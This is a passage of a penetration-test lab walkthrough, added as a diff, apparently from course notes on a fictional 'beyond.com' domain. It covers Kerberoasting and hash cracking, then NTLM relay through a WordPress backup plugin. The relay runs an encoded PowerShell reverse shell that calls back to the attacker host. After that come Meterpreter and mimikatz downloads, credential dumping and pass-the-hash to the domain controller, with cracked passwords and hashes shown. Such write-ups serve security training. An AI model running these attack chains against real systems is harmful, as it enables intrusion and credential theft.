@@ -1155,3 +1155,193 @@ Now open the page again!
 Let's try to log in with the credentials we've obtained so far as well as common username and password pairs, such as admin:admin. Unfortunately, none of them work.
 
 ## Attacking an Internal Web Application
+
+### Speak Kerberoast and Enter
+
+The web application on INTERNALSRV1 is the most promising target at the moment. Because it is a WordPress site, we could use WPScan again or use password attacks to successfully log in to WordPress's dashboard.
+
+We already obtained the information that daniela has an http SPN mapped to INTERNALSRV1. Our assumption at this point is that daniela may be able to log in to the WordPress login page successfully.
+
+Since daniela is kerberoastable, we can attempt to retrieve the user's password this way. If we can crack the TGS-REP password hash, we may be able to log in to WordPress and gain further access to INTERNALSRV1.
+
+If this attack vector fails, we can use WPScan and other web application enumeration tools to identify potential vulnerabilities on INTERNALSRV1 or switch targets to MAILSRV1.
+
+Let's perform Kerberoasting on Kali with impacket-GetUserSPNs over the SOCKS5 proxy using Proxychains.
+
+```console
+$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.123.240 beyond.com/john
+Password:
+
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  -------  --------  --------------------------  --------------------------  ----------
+http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$6525569d3a5f5d72738213b3f08b1c78$15f32ca465eb9bef6db86def2d6acb2a81e927cd55ba161dce1c06cb484f0f22eb38bd228621c7256ab41f9e25d8b12a5bf1557a1050b367a669a59797c09d58ec31c546c333ce6824140b020e3e5fd8642b5ca9f448b33dd2da3cf7e707c56f5fa78e0622fb4532200a2a3471eae5969f2105a2ab984503977d10066399a11a9c033325c1619fb55dff38a0cd84ec1712b08f52de3e6a910459eb1f7f332f08697b4b414abd08270d9bbfe6b871b4828daf6ac54f2490459c876080af82c7631819c15430f893e3ea3a770a4da597b4628d2350fd4af348d65eddf4ec7ca8f5f0b69612faa27f13f6f28e995e19cebfc12dfac2b34a326e4f76ccbcb524827984f83a5a4dac62d4138ac8ca694eec25a044a573241b39df85205987b0648940d3a824235e5464792358b42a96c3589d5ab1a919ab65235f97b6e1deb230026971873a8a08804ccdc78d5efe2a84cee968dd0730186b258441c3f60ec807dac84b4c0cd8e8f27aa10fba5d7c7c9d7f9bd77e81285b2b691043c15225b3423ca8e17322b245d3521666c026fe71868b0a4bfa13c89f2d6f9cd7a9df388f78ed72c56b515503ade5814657b9a83ed8e30bb67238df29f9038f72f36dfe3469631b770012895eaf222524b2d131a7853c91049670b18f193d1c4677c7b835b8ead72244ffb18d49e07b80a3fc1c357f40449d940a1e7bfb8e3ae9b8cf1f662d45603e77beea5f746660cec885b7ff18eefbc18de950aa64a0e67e8ec6ded9dae4830cdbfed08e30e5a9dfd7db6751a057d5f8352297d4e35740cad0315793058ade4ec1d111658625b957c61e96e6d81fa61d78c1c69a5b83296abd4abdbbde54cbb343b332fa7a77534c56b2672f4c285a04ba13fdeb9780a9a4fc022424ea9b36cd221f28446d46789196e5f1e5d450f50e2ff47c266ca8c6c3f6aee9b4d7e8f9c8e74cfa836d69fc296bd49b397cbd894c28016fae5b0fdefa28d1aebc90fadec3d8c4881bb9f7a2e532c27fbbf065de3f1cc0523a8849038b95cb8330f84140691b1e7928dd61f0fca14aa5ba17e1210d47444f49547001d4acadef964da4e8a58a17e47b3ab582984018afc6adfd6e36558e361c56988691bb05a4d0723d47f3a694d4b3b56c5b8ad0d04489f6b1de027a69f658be7f21a0ebda29982529cef108f568c68b496ec5a0aaa068b0ebebc6d70a820310986d522f1eb5388da88c8ff172d31ec1b02aea9d41772c9bc9ae568ff28337329401a3c6f29152152c45edfeafb977853f378b3cd8ec25c659a0484774273cbdd3ec07dec2e843c7e329aa94cc335c5adc930927be1001797216cd8a1274ea417381dcbba0fe5b395b
+
+$ nano daniela.hash
+
+$ sudo hashcat -m 13100 daniela.hash /home/kali/Desktop/oscp/rockyou.txt --force
+DANIelaRO123
+```
+
+We successfully cracked the TGS-REP hash and obtained the plaintext password for daniela. Let's store the username and password in creds.txt.
+
+We already established that no domain user has local Administrator privileges on any domain computers and we cannot use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.
+
+Log in to the WP site with these new creds.
+
+### Abuse a WordPress Plugin for a Relay Attack
+
+Review the configured users under Users > All Users. Daniela is the only user.
+
+Next, check Settings > General.
+
+The WordPress Address (URL) and Site Address (URL) are DNS names as we assumed. All other settings in Settings are mostly default values. 
+
+Let's review the installed plugins next.
+
+This shows three plugins, but only Backup Migration is enabled. Let's click on Manage, which brings us to the plugin configuration page. Clicking through the menus and settings, we discover the Backup directory path.
+
+This shows that we can enter a path in this field, which will be used for storing the backup. We may abuse this functionality to force an authentication of the underlying system.
+
+```
+Let's pause here for a moment and plan our next steps. At the moment, there are two promising attack vectors. The first is to upload a malicious WordPress plugin to INTERNALSRV1. By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system. For the second attack vector, we have to review the BloodHound results again and make some assumptions. As we have discovered, the local Administrator account has an active session on INTERNALSRV1. Based on this session, we can make the assumption that this user account is used to run the WordPress instance. Furthermore, it's not uncommon that the local Administrator accounts across computers in a domain are set up with the same password. Let's assume this is true for the target environment. We also learned that the domain administrator beccy has an active session on MAILSRV1 and therefore, the credentials of the user may be cached on the system. Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication. Finally, we identified the Backup directory path field in the WordPress Backup Migration plugin containing the path for the backup destination. This may allow us to force such an authentication request.
+
+Based on all of this information, let's define a plan for the second attack vector. First, we'll attempt to force an authentication request by abusing the Backup directory path of the Backup Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali machine, we can use impacket-ntlmrelayx2 to relay the incoming connection to MAILSRV1. If our assumptions are correct, the authentication request is made in the context of the local Administrator account on INTERNALSRV1, which has the same password as the local Administrator account on MAILSRV1. If this attack is successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for beccy and therefore, meet one of the primary goals of the penetration test.
+```
+
+Let's do it.
+
+```console
+$ pwsh
+> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.158",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+> $EncodedText =[Convert]::ToBase64String($Bytes)
+> $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA4ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+> exit
+
+$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.167.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA4ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+...
+[*] Servers started, waiting for connections
+
+
+// new terminal
+
+$ nc -nvlp 9999
+```
+
+Now with everything set up, we can modify the Backup directory path. Let's set the path to the URI reference //192.168.45.158/test in which the IP is the address of our Kali machine and test is a nonexistent path. Click save. Find your shell in your listener!
+
+```
+$ nc -nvlp 9999
+connect to [192.168.45.158] from (UNKNOWN) [192.168.167.242] 49196
+whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+MAILSRV1
+PS C:\Windows\system32> 
+```
+
+Great! We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as a local Administrator on MAILSRV1.
+
+## Gaining Access to the Domain Controller
+
+### Cached Credentials
+
+We obtained privileged code execution on MAILSRV1. Our next step is to extract the password hash for the user beccy, which has an active session on this system.
+
+Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for beccy.
+
+Once we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not only provide us with a more robust shell environment, but also aid in performing post-exploitation.
+
+```console
+> cd C:\Users\Administrator
+
+> iwr -uri http://192.168.45.158:8000/met.exe -Outfile met.exe
+
+> .\met.exe
+```
+
+In Metasploit, you should get a new incoming session.
+
+```
+meterpreter > 
+[*] Sending stage (200774 bytes) to 192.168.167.242
+[*] Meterpreter session 2 opened (192.168.45.158:443 -> 192.168.167.242:49245) at 2024-04-28 14:15:33 -0400
+
+meterpreter >  sessions -i 2
+
+meterpreter >  shell
+
+PS C:\Users\Administrator> iwr -uri http://192.168.45.158:8000/mimikatz.exe -Outfile mimikatz.exe
+
+> .\mimikatz.exe
+
+# privilege::debug
+
+# sekurlsa::logonpasswords
+   msv :
+         [00000003] Primary
+         * Username : beccy
+         * Domain   : BEYOND
+         * NTLM     : f0397ec5af49971f6efbdb07877046b3         // !!
+         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
+         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
+        tspkg :
+        wdigest :
+         * Username : beccy
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : beccy
+         * Domain   : BEYOND.COM
+         * Password : NiftyTopekaDevolve6655!#!     // !!
+```
+
+We successfully extracted the clear text password and NTLM hash of the domain administrator beccy. Let's store both of them together with the username in creds.txt on our Kali system.
+
+
+### Lateral Movement
+
+Because we've obtained the clear text password and NTLM hash for beccy, we can use impacket-psexec to get an interactive shell on DCSRV1. While we could use either of them, let's use the NTLM hash. Once we have a command line shell, we confirm that we have privileged access on DCSRV1 (172.16.6.240).
+
+```console
+$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.123.240
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 172.16.123.240.....
+[*] Found writable share ADMIN$
+[*] Uploading file AVIRdvYV.exe
+[*] Opening SVCManager on 172.16.123.240.....
+[*] Creating service WIQy on 172.16.123.240.....
+[*] Starting service WIQy.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+DCSRV1
+
+C:\Windows\system32> ipconfig
+ 
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 172.16.123.240
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.123.254
+```
+
+We achieved all goals of the penetration test by obtaining domain administrator privileges and accessing the domain controller.
